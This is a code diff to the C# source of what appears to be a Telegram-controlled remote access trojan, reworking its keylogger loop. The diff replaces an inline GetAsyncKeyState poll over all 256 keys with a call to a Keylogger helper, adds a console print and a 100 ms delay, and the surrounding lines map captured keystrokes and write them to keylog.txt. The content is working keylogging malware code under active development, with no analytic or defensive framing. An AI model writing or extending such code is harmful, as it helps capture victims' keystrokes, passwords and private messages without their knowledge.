@@ -1325,15 +1325,9 @@ namespace TelegramRAT
                             {
                                 shit.Clear();
                                 bool hasAtLeastOneKey = false;
-                                for (uint i = 0; i < 256; i++)
-                                {
-                                    int state = WinAPI.GetAsyncKeyState(i);
-                                    if (state != 0)
-                                    {
-                                        shit.Add(i);
-                                        hasAtLeastOneKey = true;
-                                    }
-                                }
+
+                                Console.WriteLine(Keylogger.GetPressingKeys().FirstOrDefault());
+                                
                                 if (!hasAtLeastOneKey && LastKeys.Count > 0)
                                 {
                                     char mappedKeycode = WinAPI.MapVirtualKey(LastKeys[0]);
@@ -1359,7 +1353,7 @@ namespace TelegramRAT
                                         LastKeys.Add(v);
                                     }
                                 }
-
+                                Task.Delay(100).Wait();
                             }
                             using (FileStream keylogFileStream = System.IO.File.Create("keylog.txt"))
                             {
